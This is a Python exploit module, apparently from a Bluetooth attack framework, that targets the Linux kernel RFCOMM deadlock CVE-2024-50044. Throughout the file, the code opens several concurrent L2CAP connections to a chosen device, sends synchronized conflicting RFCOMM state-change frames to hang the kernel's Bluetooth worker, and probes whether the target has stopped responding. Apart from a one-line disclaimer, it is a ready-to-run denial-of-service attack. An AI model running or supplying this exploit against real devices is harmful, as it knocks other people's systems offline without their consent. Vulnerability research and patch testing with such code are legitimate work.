"""
BlueSploit Module: Linux rfcomm_sk_state_change() Deadlock (CVE-2024-50044)
CWE-833 Deadlock in Linux kernel RFCOMM socket state change handler

A deadlock condition in rfcomm_sk_state_change() can cause the Linux kernel
Bluetooth subsystem to hang indefinitely. The function acquires a lock on
the RFCOMM socket while holding the session lock, but certain state
transitions triggered by simultaneous remote events can cause the reverse
lock order to be taken, resulting in a classic ABBA deadlock.

By crafting concurrent, conflicting state-change events from the remote side,
an attacker can freeze the RFCOMM worker thread, rendering all Bluetooth
RFCOMM functionality unavailable (system-level DoS).

Author: v33ru
CVE: CVE-2024-50044
CWE: CWE-833 (Deadlock)
"""

import struct
import socket
import time
import os
import threading
from core.base import (
    ExploitModule, ModuleInfo, ModuleOption,
    BTProtocol, Severity
)
from core.utils.printer import (
    print_success, print_error, print_info, print_warning, Colors
)

try:
    import bluetooth
    BLUETOOTH_AVAILABLE = True
except ImportError:
    BLUETOOTH_AVAILABLE = False

RFCOMM_PSM  = 0x0003
RFCOMM_SABM = 0x2F
RFCOMM_UA   = 0x63
RFCOMM_UIH  = 0xEF
RFCOMM_DM   = 0x0F
RFCOMM_DISC = 0x43

MCC_MSC  = 0xE3   # Modem Status Command
MCC_RPN  = 0x93   # Remote Port Negotiation
MCC_RLS  = 0x53   # Remote Line Status


class Module(ExploitModule):
    """
    Linux rfcomm_sk_state_change() Deadlock (CVE-2024-50044)

    Triggers a deadlock in rfcomm_sk_state_change() by sending simultaneous
    conflicting state-change events (DISC + MSC + RLS) on the same DLCI
    from multiple connections. The kernel's RFCOMM worker thread attempts
    to process these while holding the session lock, triggering the ABBA
    deadlock with the socket lock.

    Attack flow:
    1. Establish N concurrent L2CAP connections to the same RFCOMM PSM
    2. On each, open the same DLCI (causes shared DLC state contention)
    3. Send simultaneous DISC + MSC + RLS from all connections
    4. The kernel's rfcomm_sk_state_change() path deadlocks:
       - Thread A: session_lock → socket_lock (normal path)
       - Thread B: socket_lock → session_lock (state_change callback)
    5. RFCOMM worker thread hangs indefinitely

    Impact: System hang — all Bluetooth RFCOMM activity frozen
    Detection: dmesg shows "INFO: task rfcomm:N blocked for more than Xs"
    """

    info = ModuleInfo(
        name="Linux rfcomm_sk_state_change() Deadlock",
        description=(
            "Triggers kernel RFCOMM worker thread deadlock via concurrent "
            "conflicting state-change events (CVE-2024-50044)"
        ),
        author=["v33ru"],
        protocol=BTProtocol.CLASSIC,
        severity=Severity.HIGH,
        cve=["CVE-2024-50044"],
        references=[
            "https://nvd.nist.gov/vuln/detail/CVE-2024-50044",
            "https://git.kernel.org/pub/scm/linux/kernel/git/stable/linux.git/log/net/bluetooth/rfcomm",
        ],
    )

    def _setup_options(self) -> None:
        self.add_option(ModuleOption(
            name="target",
            required=True,
            description="Target BD_ADDR (XX:XX:XX:XX:XX:XX)",
        ))
        self.add_option(ModuleOption(
            name="interface",
            required=False,
            description="Local HCI adapter",
            default="hci0",
        ))
        self.add_option(ModuleOption(
            name="connections",
            required=False,
            description="Concurrent L2CAP connections",
            default=6,
        ))
        self.add_option(ModuleOption(
            name="target_channel",
            required=False,
            description="RFCOMM channel for shared DLC contention",
            default=1,
        ))
        self.add_option(ModuleOption(
            name="rounds",
            required=False,
            description="Deadlock trigger rounds",
            default=5,
        ))

    def check(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        target = self.get_option("target")
        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(5.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            print_success(f"RFCOMM PSM reachable — {target} may be vulnerable to CVE-2024-50044")
            return True
        except bluetooth.BluetoothError as e:
            print_error(f"Unreachable: {e}")
            return False

    def run(self) -> bool:
        if not BLUETOOTH_AVAILABLE:
            print_error("pybluez2 required — pip install pybluez2")
            return False
        if os.geteuid() != 0:
            print_error("Root privileges required")
            return False

        target     = self.get_option("target")
        n_conns    = int(self.get_option("connections"))
        channel    = int(self.get_option("target_channel"))
        rounds     = int(self.get_option("rounds"))

        if not self.validate_bd_addr(target):
            print_error(f"Invalid BD_ADDR: {target}")
            return False

        dlci = channel << 1 | 1

        print_info(f"Target      : {target}")
        print_info(f"Connections : {n_conns} concurrent (contending on DLCI {dlci})")
        print_info(f"Rounds      : {rounds}")
        print_info("─" * 50)
        print_warning("DISCLAIMER: For authorized security testing only!")
        print_info("Triggering CVE-2024-50044 — rfcomm_sk_state_change() deadlock...")

        deadlock_signals = 0
        barrier = threading.Barrier(n_conns)  # synchronized simultaneous send

        for rnd in range(rounds):
            print_info(f"[{rnd + 1}/{rounds}] Opening {n_conns} concurrent connections...")
            sockets = []
            errors = []

            # Open all connections
            for _ in range(n_conns):
                try:
                    s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
                    s.settimeout(4.0)
                    s.connect((target, RFCOMM_PSM))
                    sockets.append(s)
                except bluetooth.BluetoothError as e:
                    errors.append(str(e))

            if not sockets:
                print_warning(f"  Round {rnd + 1}: all connects failed — {errors[0] if errors else '?'}")
                deadlock_signals += 1
                time.sleep(0.5)
                continue

            # Setup mux and shared DLCI on each connection
            for s in sockets:
                try:
                    s.send(self._sabm(0))
                    self._drain(s, 0.3)
                    s.send(self._sabm(dlci))
                    self._drain(s, 0.3)
                except Exception:
                    pass

            # Synchronized simultaneous conflicting state events
            results = [None] * len(sockets)

            def send_state_change(idx: int, sock) -> None:
                try:
                    barrier.wait(timeout=3.0)
                    # Send DISC + MSC + RLS simultaneously from all connections
                    sock.send(self._disc(dlci))
                    sock.send(self._mcc_msc(dlci))
                    sock.send(self._mcc_rls(dlci, 0x03))
                    results[idx] = "sent"
                except threading.BrokenBarrierError:
                    results[idx] = "barrier_broken"
                except (bluetooth.BluetoothError, OSError) as e:
                    results[idx] = f"error:{e}"

            threads = [
                threading.Thread(target=send_state_change, args=(i, s), daemon=True)
                for i, s in enumerate(sockets)
            ]
            for t in threads:
                t.start()
            for t in threads:
                t.join(timeout=5.0)

            sent_count = sum(1 for r in results if r == "sent")
            error_count = sum(1 for r in results if r and r.startswith("error"))

            print_info(f"  Round {rnd + 1}: {sent_count}/{len(sockets)} state-change bursts sent, {error_count} errors")

            if error_count > 0:
                deadlock_signals += 1
                print_warning(f"  Connection errors after state-change burst — possible deadlock")

            # Close all sockets
            for s in sockets:
                try:
                    s.close()
                except Exception:
                    pass

            # Test if target is still responding (deadlock check)
            time.sleep(0.5)
            still_alive = self._probe(target)
            if not still_alive:
                print_success(f"  Round {rnd + 1}: target not responding — deadlock likely triggered!")
                deadlock_signals += 1

        print_info("─" * 50)
        print_success(f"CVE-2024-50044: {rounds} deadlock attempts sent to {target}")
        if deadlock_signals > 0:
            print_success(f"Deadlock indicators: {deadlock_signals}")
            print_info("Check target dmesg for 'blocked for more than' or 'possible deadlock'")
        else:
            print_info("No definitive deadlock detected — target may be patched")

        self.add_result({
            "target": target,
            "rounds": rounds,
            "connections": n_conns,
            "deadlock_signals": deadlock_signals,
            "cve": "CVE-2024-50044",
        })
        return True

    def _probe(self, target: str) -> bool:
        """Quick probe to check if RFCOMM PSM is still reachable."""
        try:
            s = bluetooth.BluetoothSocket(bluetooth.L2CAP)
            s.settimeout(2.0)
            s.connect((target, RFCOMM_PSM))
            s.close()
            return True
        except Exception:
            return False

    def _sabm(self, dlci: int) -> bytes:
        addr = (dlci << 2) | 0x03
        ctrl = RFCOMM_SABM | 0x10
        length = 0x01
        fcs = self._fcs(bytes([addr, ctrl, length]))
        return struct.pack("BBBB", addr, ctrl, length, fcs)

    def _disc(self, dlci: int) -> bytes:
        addr = (dlci << 2) | 0x03
        ctrl = RFCOMM_DISC | 0x10
        length = 0x01
        fcs = self._fcs(bytes([addr, ctrl, length]))
        return struct.pack("BBBB", addr, ctrl, length, fcs)

    def _mcc_msc(self, dlci: int) -> bytes:
        payload = struct.pack("BB", (dlci << 2) | 0x03, 0x8D)
        mcc = struct.pack("BB", MCC_MSC, (len(payload) << 1) | 1) + payload
        return self._uih_wrap(mcc)

    def _mcc_rls(self, dlci: int, status: int) -> bytes:
        payload = struct.pack("BB", (dlci << 2) | 0x03, status)
        mcc = struct.pack("BB", MCC_RLS, (len(payload) << 1) | 1) + payload
        return self._uih_wrap(mcc)

    def _uih_wrap(self, mcc: bytes) -> bytes:
        addr = 0x03
        ctrl = RFCOMM_UIH
        length = (len(mcc) << 1) | 0x01
        fcs = self._fcs(bytes([addr, ctrl]))
        return struct.pack("BBB", addr, ctrl, length) + mcc + struct.pack("B", fcs)

    def _drain(self, sock, timeout: float) -> None:
        try:
            sock.settimeout(timeout)
            while True:
                sock.recv(512)
        except (socket.timeout, bluetooth.BluetoothError, OSError):
            pass

    @staticmethod
    def _fcs(data: bytes) -> int:
        table = [
            0x00,0x91,0xE3,0x72,0x07,0x96,0xE4,0x75,0x0E,0x9F,0xED,0x7C,0x09,0x98,0xEA,0x7B,
            0x1C,0x8D,0xFF,0x6E,0x1B,0x8A,0xF8,0x69,0x12,0x83,0xF1,0x60,0x15,0x84,0xF6,0x67,
            0x38,0xA9,0xDB,0x4A,0x3F,0xAE,0xDC,0x4D,0x36,0xA7,0xD5,0x44,0x31,0xA0,0xD2,0x43,
            0x24,0xB5,0xC7,0x56,0x23,0xB2,0xC0,0x51,0x2A,0xBB,0xC9,0x58,0x2D,0xBC,0xCE,0x5F,
            0x70,0xE1,0x93,0x02,0x77,0xE6,0x94,0x05,0x7E,0xEF,0x9D,0x0C,0x79,0xE8,0x9A,0x0B,
            0x6C,0xFD,0x8F,0x1E,0x6B,0xFA,0x88,0x19,0x62,0xF3,0x81,0x10,0x65,0xF4,0x86,0x17,
            0x48,0xD9,0xAB,0x3A,0x4F,0xDE,0xAC,0x3D,0x46,0xD7,0xA5,0x34,0x41,0xD0,0xA2,0x33,
            0x54,0xC5,0xB7,0x26,0x53,0xC2,0xB0,0x21,0x5A,0xCB,0xB9,0x28,0x5D,0xCC,0xBE,0x2F,
            0xE0,0x71,0x03,0x92,0xE7,0x76,0x04,0x95,0xEE,0x7F,0x0D,0x9C,0xE9,0x78,0x0A,0x9B,
            0xFC,0x6D,0x1F,0x8E,0xFB,0x6A,0x18,0x89,0xF2,0x63,0x11,0x80,0xF5,0x64,0x16,0x87,
            0xD8,0x49,0x3B,0xAA,0xDF,0x4E,0x3C,0xAD,0xD6,0x47,0x35,0xA4,0xD1,0x40,0x32,0xA3,
            0xC4,0x55,0x27,0xB6,0xC3,0x52,0x20,0xB1,0xCA,0x5B,0x29,0xB8,0xCD,0x5C,0x2E,0xBF,
            0x90,0x01,0x73,0xE2,0x97,0x06,0x74,0xE5,0x9E,0x0F,0x7D,0xEC,0x99,0x08,0x7A,0xEB,
            0x8C,0x1D,0x6F,0xFE,0x8B,0x1A,0x68,0xF9,0x82,0x13,0x61,0xF0,0x85,0x14,0x66,0xF7,
            0xA8,0x39,0x4B,0xDA,0xAF,0x3E,0x4C,0xDD,0xA6,0x37,0x45,0xD4,0xA1,0x30,0x42,0xD3,
            0xB4,0x25,0x57,0xC6,0xB3,0x22,0x50,0xC1,0xBA,0x2B,0x59,0xC8,0xBD,0x2C,0x5E,0xCF,
        ]
        fcs = 0xFF
        for b in data:
            fcs = table[fcs ^ b]
        return 0xFF - fcs
